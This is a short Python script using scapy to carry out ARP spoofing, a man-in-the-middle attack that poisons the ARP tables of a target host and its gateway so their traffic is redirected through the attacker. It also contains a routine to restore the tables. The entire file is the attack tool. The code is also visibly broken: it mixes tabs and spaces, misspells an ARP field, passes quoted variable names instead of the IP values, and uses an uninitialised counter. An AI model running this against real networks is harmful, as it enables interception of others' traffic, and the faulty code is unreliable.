#python3
import scapy.all as scapy
import time

target_ip = input("enter target ip address.")
gateway_ip = input("enter the gateway ip or the routers ip")


def Get_mac(IP):
	apr_request = scapy.ARP(pdst=IP)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	apr_request_broatcast = broadcast/apr_request
	answered_list = scapy.srp(apr_request_broatcast, timeout=1, verbose=False)[0]
	return answered_list[0][1].hwsrc

def Spoof(target_ip, spoof_ip):
	target_mac = Get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
	destination_mac = Get_mac(destination_ip)
	source_mac = Get_mac(source_ip)
    packet = scapy.ARP(op=2, psdt=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

try:
	while True:
		Spoof("target_ip", "gateway_ip")	
	    Spoof("gateway_ip", "target_ip")
	    sent_packet_count = sent_packet_count + 2
	    print("\r[+] packet sent " + str(sent_packet_count), end="")
	    time.sleep(2)
	    
except KeyboardInterrupt:
	print("[+] detected CTRL + C....... resetting ARP table........please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

